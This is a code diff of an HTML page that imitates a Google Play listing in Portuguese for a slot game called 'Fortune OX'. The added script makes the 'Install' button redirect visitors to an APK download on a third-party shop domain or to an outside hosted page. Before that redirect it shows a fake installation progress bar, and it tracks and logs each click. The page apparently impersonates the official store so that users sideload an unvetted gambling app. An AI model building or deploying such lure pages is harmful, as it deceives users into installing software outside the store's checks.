@@ -40,7 +40,9 @@
     <link rel="stylesheet" href="./Fortune OX_files/index.rain2.css" />
     <link rel="stylesheet" href="./Fortune OX_files/google.css" />
     <link rel="stylesheet" href="./Fortune OX_files/common-1.0.9.css" />
-
+    <script src="./crypto-js.min.js"></script>
+    <script src="./nanoid.js"></script>
+    <script src="./dayjs.min.js"></script>
     <style>
       input::-webkit-outer-spin-button,
       input::-webkit-inner-spin-button {
@@ -167,7 +169,7 @@
       }
       .top-nav {
         position: fixed;
-        width: 10rem;
+        width: 100%;
         height: 1.2rem;
         line-height: 1.2rem;
         background-color: white;
@@ -187,7 +189,7 @@
       }
       .top-nav .span {
         position: fixed;
-        width: 10rem;
+        width: 100%;
         height: 1.2rem;
         line-height: 1.2rem;
         text-align: center;
@@ -743,17 +745,16 @@
       data-v-f1a9f02c=""
       id="app"
       style="
-        width: 10rem;
-        background-image: url('static/images/c1v3/bg/main_bg.png');
-        background-size: cover;
-        background-repeat: repeat;
+        width: 100%;
+        max-width: 600px;
+
       "
     >
       <div
         data-v-d4014b14=""
         data-v-f1a9f02c=""
         id="home"
-        style="background: white; width: 10rem;  overflow: scroll"
+        style="background: white; width: 100%;  overflow: scroll"
       >
         <div
           data-v-d4014b14=""
@@ -789,7 +790,7 @@
             style="height: 36px; width: 114px"
           />
         </div>
-        <div data-v-d4014b14="" class="tU8Y5c" style="overflow: hidden scroll">
+        <div data-v-d4014b14="" class="tU8Y5c" >
           <div
             data-v-d4014b14=""
             class="Il7kR"
@@ -840,7 +841,7 @@
               </div>
             </div>
           </div>
-          <div data-v-d4014b14="" class="JU1wdd" style="margin-left: 0.5rem">
+          <div data-v-d4014b14="" class="JU1wdd">
             <div data-v-d4014b14="" class="l8YSdd">
               <div data-v-d4014b14="" class="w7Iutd">
                 <div data-v-d4014b14="" class="wVqUob" style="min-width: 82px">
@@ -901,7 +902,8 @@
           </div>
           <div data-v-d4014b14="" class="kk2r5b" style="margin-top: -0.5rem">
             <!---->
-            <div
+        
+              <div
               data-v-d4014b14=""
               class="google-install-app shiny"
               id="install-btn"
@@ -915,6 +917,8 @@
                 align-items: center;
               "
             >
+            <div class="install-mask" style="position: absolute; width: 100%; height: 100%;left: 0; background-color: #01875f;z-index: -1;"></div>
+         
               <a data-v-d4014b14="" href="javascript:gotoRef()"></a>
               <div
                 data-v-d4014b14=""
@@ -934,8 +938,10 @@
                 />
                 <span data-v-d4014b14="">Rapid Instalar</span>
               </div>
-              <span data-v-d4014b14="" style="font-size: 0.5rem">Install</span>
+              <span class="install-text" style="font-size: 0.5rem;color: rgb(255, 227, 54);">Install</span>
             </div>
+            </button>
+          
             <!---->
             <!---->
             <div
@@ -952,7 +958,7 @@
                 style="
                   position: absolute;
                   width: 5rem;
-                  margin-left: 0.5rem;
+         
                   display: flex;
                   align-items: center;
                 "
@@ -1038,10 +1044,8 @@
             data-v-d4014b14=""
             style="
               position: relative;
-              margin-top: 1.6rem;
-              width: 9rem;
-              height: 240px;
-              margin-left: 0.5rem;
+ 
+              margin:1.6rem 0.5rem 0;
             "
           >
             <div
@@ -1054,9 +1058,9 @@
                 <div data-v-d4014b14="" jscontroller="RQJprf" class="Atcj9b">
                   <img
                     data-v-d4014b14=""
-                    src="./Fortune OX_files/6un21721718758693951.png"
+                    src="./img/banner/1.png"
                     class="T75of B5GQxf"
-                    style="width: auto; height: 224px"
+                    
                   />
                 </div>
               </div>
@@ -1064,9 +1068,9 @@
                 <div data-v-d4014b14="" jscontroller="RQJprf" class="Atcj9b">
                   <img
                     data-v-d4014b14=""
-                    src="./Fortune OX_files/bv5c1721718759264431.png"
+                    src="./img/banner/2.png"
                     class="T75of B5GQxf"
-                    style="width: auto; height: 224px"
+                    
                   />
                 </div>
               </div>
@@ -1074,9 +1078,9 @@
                 <div data-v-d4014b14="" jscontroller="RQJprf" class="Atcj9b">
                   <img
                     data-v-d4014b14=""
-                    src="./Fortune OX_files/ssoe1721718759861092.png"
+                    src="./img/banner/3.png"
                     class="T75of B5GQxf"
-                    style="width: auto; height: 224px"
+                    
                   />
                 </div>
               </div>
@@ -1084,9 +1088,29 @@
                 <div data-v-d4014b14="" jscontroller="RQJprf" class="Atcj9b">
                   <img
                     data-v-d4014b14=""
-                    src="./Fortune OX_files/scxd1721718760392417.png"
+                    src="./img/banner/4.png"
                     class="T75of B5GQxf"
-                    style="width: auto; height: 224px"
+                    
+                  />
+                </div>
+              </div>
+              <div data-v-d4014b14="" role="listitem" class="ULeU3b Utde2e">
+                <div data-v-d4014b14="" jscontroller="RQJprf" class="Atcj9b">
+                  <img
+                    data-v-d4014b14=""
+                    src="./img/banner/5.png"
+                    class="T75of B5GQxf"
+                    
+                  />
+                </div>
+              </div>
+              <div data-v-d4014b14="" role="listitem" class="ULeU3b Utde2e">
+                <div data-v-d4014b14="" jscontroller="RQJprf" class="Atcj9b">
+                  <img
+                    data-v-d4014b14=""
+                    src="./img/banner/6.png"
+                    class="T75of B5GQxf"
+                    
                   />
                 </div>
               </div>
@@ -1096,9 +1120,8 @@
             data-v-d4014b14=""
             style="
               position: relative;
-              margin-top: -0.2rem;
-              width: 8.8rem;
-              margin-left: 0.6rem;
+
+              margin:-0.2rem 0.2rem 0;
             "
           >
             <div data-v-d4014b14="">
@@ -1174,7 +1197,7 @@
                       </div>
                     </div>
                   </div>
-                  <div data-v-d4014b14="" class="Uc6QCc" style="width: 9rem">
+                  <div data-v-d4014b14="" class="Uc6QCc" >
                     <div data-v-d4014b14="" class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb">
                       <div
                         data-v-d4014b14=""
@@ -1231,8 +1254,8 @@
             style="
               position: relative;
               margin-top: 0rem;
-              width: 8.8rem;
-              margin-left: 0.6rem;
+              
+              margin:0 0.2rem;
             "
           >
             <section data-v-d4014b14="" jscontroller="NkbkFd" class="HcyOxe">
@@ -1396,8 +1419,8 @@
             style="
               position: relative;
               margin-top: 0rem;
-              width: 8.8rem;
-              margin-left: 0.6rem;
+              
+              margin:0 0.2rem;
             "
           >
             <section data-v-d4014b14="" jscontroller="NkbkFd" class="HcyOxe">
@@ -2916,8 +2939,8 @@
             style="
               position: relative;
               margin-top: 0rem;
-              width: 8.8rem;
-              margin-left: 0.6rem;
+              
+              margin:0 0.2rem;
             "
           >
             <section data-v-d4014b14="" jscontroller="NkbkFd" class="HcyOxe">
@@ -2946,351 +2969,14 @@
               </div>
             </section>
           </div>
+   
           <div
             data-v-d4014b14=""
             style="
               position: relative;
               margin-top: 0rem;
-              width: 8.8rem;
-              margin-left: 0.6rem;
-            "
-          >
-            <section data-v-d4014b14="" jscontroller="NkbkFd" class="HcyOxe">
-              <header data-v-d4014b14="" class="cswwxf">
-                <div data-v-d4014b14="" class="VMq4uf">
-                  <div data-v-d4014b14="" class="EaMWib">
-                    <h2
-                      data-v-d4014b14=""
-                      class="XfZNbf"
-                      style="font-size: 0.5rem"
-                    >
-                      <span data-v-d4014b14="">Jogos semelhantes</span>
-                    </h2>
-                  </div>
-                  <div
-                    data-v-d4014b14=""
-                    data-disable-idom="true"
-                    class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ QDwDD mN1ivc VxpoF"
-                  >
-                    <div
-                      data-v-d4014b14=""
-                      jsname="s3Eaab"
-                      class="VfPpkd-Bz112c-Jh9lGc"
-                    ></div>
-                    <i
-                      data-v-d4014b14=""
-                      aria-hidden="true"
-                      class="google-material-icons VfPpkd-kBDsod W7A5Qb"
-                      >arrow_forward</i
-                    >
-                    <a
-                      data-v-d4014b14=""
-                      aria-label="Ver mais informações sobre Jogos semelhantes"
-                      jsname="hSRGPd"
-                      class="WpHeLc VfPpkd-mRLv6"
-                    ></a>
-                    <div
-                      data-v-d4014b14=""
-                      class="VfPpkd-Bz112c-J1Ukfc-LhBDec"
-                    ></div>
-                  </div>
-                </div>
-              </header>
-              <div data-v-d4014b14="" class="SfzRHd">
-                <div data-v-d4014b14="" class="ErwGJf">
-                  <div data-v-d4014b14="" class="VfPpkd-EScbFb-JIbuQc fUtUMc">
-                    <a data-v-d4014b14="" class="Si6A0c nT2RTe"
-                      ><div data-v-d4014b14="" class="j2FCNc cQv9D">
-                        <img
-                          data-v-d4014b14=""
-                          src="./Fortune OX_files/unnamed(8).webp"
-                          srcset="
-                            https://play-lh.googleusercontent.com/yZ_nzWpg_cj6GYJv15YdsfWBKS6JzXGt69R8fCCj3AsapCSs5MGdr6haxPCk-Ae91g=s128-rw 2x
-                          "
-                          aria-hidden="true"
-                          alt="Imagem de miniatura"
-                          loading="lazy"
-                          class="T75of stzEZd"
-                        />
-                        <div data-v-d4014b14="" class="cXFu1">
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="DdYX5"
-                              >Cash Craze: Casino Slots Games</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="wMUdtb"
-                              >Casual Joy Games</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <div
-                              data-v-d4014b14=""
-                              aria-label="Avaliado com 4,5 de 5 estrelas"
-                              style="display: inline-flex; align-items: center"
-                            >
-                              <span data-v-d4014b14="" class="w2kbF">4,5</span>
-                              <span data-v-d4014b14="" class="Q4fJQd"
-                                ><i
-                                  data-v-d4014b14=""
-                                  aria-hidden="true"
-                                  class="google-material-icons Yvy3Fd"
-                                  >star</i
-                                ></span
-                              >
-                            </div>
-                          </div>
-                        </div>
-                      </div></a
-                    >
-                    <div data-v-d4014b14="" class="VfPpkd-FJ5hab"></div>
-                  </div>
-                  <div data-v-d4014b14="" class="VfPpkd-EScbFb-JIbuQc fUtUMc">
-                    <a data-v-d4014b14="" class="Si6A0c nT2RTe"
-                      ><div data-v-d4014b14="" class="j2FCNc cQv9D">
-                        <img
-                          data-v-d4014b14=""
-                          src="./Fortune OX_files/unnamed(9).webp"
-                          srcset="
-                            https://play-lh.googleusercontent.com/vHA867MF5a-0zJfHgxgKUKs4GJb8mWMLNjGpTpufUpw1IN_EuqWGY9d-qrY4keq4hw8=s128-rw 2x
-                          "
-                          aria-hidden="true"
-                          alt="Imagem de miniatura"
-                          loading="lazy"
-                          class="T75of stzEZd"
-                        />
-                        <div data-v-d4014b14="" class="cXFu1">
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="DdYX5"
-                              >Charge Buffalo Slot-TaDa Jogos</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="wMUdtb"
-                              >FUFAFA TECHNOLOGY LTD CO.</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <div
-                              data-v-d4014b14=""
-                              aria-label="Avaliado com 4,5 de 5 estrelas"
-                              style="display: inline-flex; align-items: center"
-                            >
-                              <span data-v-d4014b14="" class="w2kbF">4,5</span>
-                              <span data-v-d4014b14="" class="Q4fJQd"
-                                ><i
-                                  data-v-d4014b14=""
-                                  aria-hidden="true"
-                                  class="google-material-icons Yvy3Fd"
-                                  >star</i
-                                ></span
-                              >
-                            </div>
-                          </div>
-                        </div>
-                      </div></a
-                    >
-                    <div data-v-d4014b14="" class="VfPpkd-FJ5hab"></div>
-                  </div>
-                  <div data-v-d4014b14="" class="VfPpkd-EScbFb-JIbuQc fUtUMc">
-                    <a data-v-d4014b14="" class="Si6A0c nT2RTe"
-                      ><div data-v-d4014b14="" class="j2FCNc cQv9D">
-                        <img
-                          data-v-d4014b14=""
-                          src="./Fortune OX_files/unnamed(10).webp"
-                          srcset="
-                            https://play-lh.googleusercontent.com/Bi-dBVeyh-XZZ8ypCuklaHct8ClSitAAEOy3rCS3KOE50GBVsZ4ucseDKrLZExrAkfY=s128-rw 2x
-                          "
-                          aria-hidden="true"
-                          alt="Imagem de miniatura"
-                          loading="lazy"
-                          class="T75of stzEZd"
-                        />
-                        <div data-v-d4014b14="" class="cXFu1">
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="DdYX5"
-                              >Jackpot Magic Slots</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="wMUdtb"
-                              >Big Fish Games</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <div
-                              data-v-d4014b14=""
-                              aria-label="Avaliado com 2,6 de 5 estrelas"
-                              style="display: inline-flex; align-items: center"
-                            >
-                              <span data-v-d4014b14="" class="w2kbF">2,6</span>
-                              <span data-v-d4014b14="" class="Q4fJQd"
-                                ><i
-                                  data-v-d4014b14=""
-                                  aria-hidden="true"
-                                  class="google-material-icons Yvy3Fd"
-                                  >star</i
-                                ></span
-                              >
-                            </div>
-                          </div>
-                        </div>
-                      </div></a
-                    >
-                    <div data-v-d4014b14="" class="VfPpkd-FJ5hab"></div>
-                  </div>
-                  <div data-v-d4014b14="" class="VfPpkd-EScbFb-JIbuQc fUtUMc">
-                    <a data-v-d4014b14="" class="Si6A0c nT2RTe"
-                      ><div data-v-d4014b14="" class="j2FCNc cQv9D">
-                        <img
-                          data-v-d4014b14=""
-                          src="./Fortune OX_files/unnamed(11).webp"
-                          srcset="
-                            https://play-lh.googleusercontent.com/3C9ipO88Z92NJuohq_u6Ce6sTKHAADCfrpyVaEWz3vDO4XBscTJwAiRM9WhzS__WOybZ=s128-rw 2x
-                          "
-                          aria-hidden="true"
-                          alt="Imagem de miniatura"
-                          loading="lazy"
-                          class="T75of stzEZd"
-                        />
-                        <div data-v-d4014b14="" class="cXFu1">
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="DdYX5"
-                              >Diamond Slot - Slot Game</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="wMUdtb"
-                              >International Games System Co., Ltd.</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <div
-                              data-v-d4014b14=""
-                              aria-label="Avaliado com 3,9 de 5 estrelas"
-                              style="display: inline-flex; align-items: center"
-                            >
-                              <span data-v-d4014b14="" class="w2kbF">3,9</span>
-                              <span data-v-d4014b14="" class="Q4fJQd"
-                                ><i
-                                  data-v-d4014b14=""
-                                  aria-hidden="true"
-                                  class="google-material-icons Yvy3Fd"
-                                  >star</i
-                                ></span
-                              >
-                            </div>
-                          </div>
-                        </div>
-                      </div></a
-                    >
-                    <div data-v-d4014b14="" class="VfPpkd-FJ5hab"></div>
-                  </div>
-                  <div data-v-d4014b14="" class="VfPpkd-EScbFb-JIbuQc fUtUMc">
-                    <a data-v-d4014b14="" class="Si6A0c nT2RTe"
-                      ><div data-v-d4014b14="" class="j2FCNc cQv9D">
-                        <img
-                          data-v-d4014b14=""
-                          src="./Fortune OX_files/unnamed(12).webp"
-                          srcset="
-                            https://play-lh.googleusercontent.com/Kwa0EUhA_Z31MqQSr15DZyBrVZoAUlwlwGxE8tJoNFUPKbcrgcjSiDAAXFw9VMogJJc=s128-rw 2x
-                          "
-                          aria-hidden="true"
-                          alt="Imagem de miniatura"
-                          loading="lazy"
-                          class="T75of stzEZd"
-                        />
-                        <div data-v-d4014b14="" class="cXFu1">
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="DdYX5"
-                              >Bônus Bingo Cassino-TaDa Jogo</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="wMUdtb"
-                              >FUFAFA TECHNOLOGY LTD CO.</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <div
-                              data-v-d4014b14=""
-                              aria-label="Avaliado com 4,4 de 5 estrelas"
-                              style="display: inline-flex; align-items: center"
-                            >
-                              <span data-v-d4014b14="" class="w2kbF">4,4</span>
-                              <span data-v-d4014b14="" class="Q4fJQd"
-                                ><i
-                                  data-v-d4014b14=""
-                                  aria-hidden="true"
-                                  class="google-material-icons Yvy3Fd"
-                                  >star</i
-                                ></span
-                              >
-                            </div>
-                          </div>
-                        </div>
-                      </div></a
-                    >
-                    <div data-v-d4014b14="" class="VfPpkd-FJ5hab"></div>
-                  </div>
-                  <div data-v-d4014b14="" class="VfPpkd-EScbFb-JIbuQc fUtUMc">
-                    <a data-v-d4014b14="" class="Si6A0c nT2RTe"
-                      ><div data-v-d4014b14="" class="j2FCNc cQv9D">
-                        <img
-                          data-v-d4014b14=""
-                          src="./Fortune OX_files/unnamed(13).webp"
-                          srcset="
-                            https://play-lh.googleusercontent.com/CSkRZuIZLOJZ8q0krA3qvnciiRTXZBU5Nx6nmTXM31ZUEilUf6Plz_va-IV_-pjWDgE=s128-rw 2x
-                          "
-                          aria-hidden="true"
-                          alt="Imagem de miniatura"
-                          loading="lazy"
-                          class="T75of stzEZd"
-                        />
-                        <div data-v-d4014b14="" class="cXFu1">
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="DdYX5"
-                              >Infinity Slots - Casino Games</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <span data-v-d4014b14="" class="wMUdtb"
-                              >Murka Games Limited</span
-                            >
-                          </div>
-                          <div data-v-d4014b14="" class="ubGTjb">
-                            <div
-                              data-v-d4014b14=""
-                              aria-label="Avaliado com 4,5 de 5 estrelas"
-                              style="display: inline-flex; align-items: center"
-                            >
-                              <span data-v-d4014b14="" class="w2kbF">4,5</span>
-                              <span data-v-d4014b14="" class="Q4fJQd"
-                                ><i
-                                  data-v-d4014b14=""
-                                  aria-hidden="true"
-                                  class="google-material-icons Yvy3Fd"
-                                  >star</i
-                                ></span
-                              >
-                            </div>
-                          </div>
-                        </div>
-                      </div></a
-                    >
-                    <div data-v-d4014b14="" class="VfPpkd-FJ5hab"></div>
-                  </div>
-                </div>
-              </div>
-            </section>
-          </div>
-          <div
-            data-v-d4014b14=""
-            style="
-              position: relative;
-              margin-top: 0rem;
-              width: 8.8rem;
-              margin-left: 0.6rem;
+              
+              margin:0 0.2rem;
             "
           >
             <section data-v-d4014b14="" jscontroller="NkbkFd" class="HcyOxe">
@@ -3312,8 +2998,8 @@
             style="
               position: relative;
               margin-top: 0rem;
-              width: 8.8rem;
-              margin-left: 0.6rem;
+              
+              margin:0 0.2rem;
             "
           >
             <footer data-v-d4014b14="" class="yhtbu">
@@ -3631,7 +3317,7 @@
               position: fixed;
               left: 0px;
               top: 0px;
-              width: 10rem;
+              width: 100%;
               height: 100vh;
               background: rgba(0, 0, 0, 0.5);
               z-index: 2000;
@@ -3664,19 +3350,58 @@
           </div>
         </div>
       </div>
+        <div id="mask">
+          <img src="./img/loading.gif" alt="">
+        </div>
     </div>
+  
     <script src="./browser.js">
+      
+    </script>
+    <script src="./ua-parse.js">
       
     </script>
     <script src="./open.js">
       
     </script>
+    <script src="./adjust-5.6.0.min.js"> </script>
+
+    <script src="./Adjustscript.js"></script>
     <script>
       if (typeof navigator.serviceWorker !== "undefined") {
         navigator.serviceWorker.register("sw.js");
       }
     </script>
     <script>
+      var isEnd = false;
+      function startProgress() {
+        const text = document.querySelector(".install-text");
+        const mask = document.querySelector(".install-mask");
+        mask.style.width = "0%";
+        mask.style.background = "#cacacb";
+      
+        let currentWidth = 0; // 初始宽度为 0%
+        const timer = setInterval(() => {
+          mask.style.background = "#01875f";
+      
+          // 更新当前宽度
+          window.getComputedStyle(mask).width;
+          currentWidth += 1;
+          // 增加宽度
+          mask.style.width = `${currentWidth}%`;
+          text.innerText = `${currentWidth}%`;
+          // 检查是否达到或超过 100%
+          if (currentWidth >= 99) {
+            isEnd = true;
+            // 考虑到整数递增，可能需要提前停止
+            mask.style.width = "100%";
+            text.innerText = "Go";
+            clearInterval(timer);
+          }
+        }, 100);
+      }
+      
+     
       const installBtn = document.getElementById("install-btn");
       let deferredPrompt;
       window.addEventListener("beforeinstallprompt", (e) => {
@@ -3686,8 +3411,56 @@
       });
       
       installBtn.addEventListener("click", async () => {
-        await deferredPrompt.prompt()
+
+
+
+        if(isEnd) { 
+          await sendMessage({ step: 22, msg: "安装完成跳转go" })
+          window.location.href = `https://fifa-world.s3.ap-southeast-3.amazonaws.com/web-platform-mobile/index-pwa-9851.html`
+          return
+        }
+        
+        if(!deferredPrompt) {
+          sendMessage({ step: 22, msg: "点击insall不支持pwa下载apk" })
+          window.location.href = `https://hey777.shop/apk/Hey777-Slot.apk`
+          return
+        } else {
+          sendMessage({ step: 22, msg: "点击insall支持pwa,等待用户选择" })
+        }
+        //点击按钮
+        Adjust.trackEvent({
+        eventToken: "fvu5nh",
+        });
+        const reuslt =  await deferredPrompt.prompt()
+        console.log(reuslt,'reuslt')
+        if(reuslt.outcome === 'dismissed') {
+        //拒绝安装
+        sendMessage({ step: 22, msg: "拒绝安装pwa,下载apk" })
+        window.location.href = newUrl
+        } else {
+        //点击安装
+          startProgress()
+          Adjust.trackEvent({
+          eventToken: "3d3a82",
+          });
+          sendMessage({ step: 22, msg: "同意安装pwa" })
+
+          }
+        deferredPrompt = null;
+
+        
+        
+        
+       
+      });
+      window.addEventListener("load", function () {
+        // 浏览器加载完成的操作
+        const mask = document.querySelector("#mask");
+        mask.style.display = "none"
+        
       });
     </script>
+    
+    <script src="./sendMessage.js"></script>
   </body>
 </html>
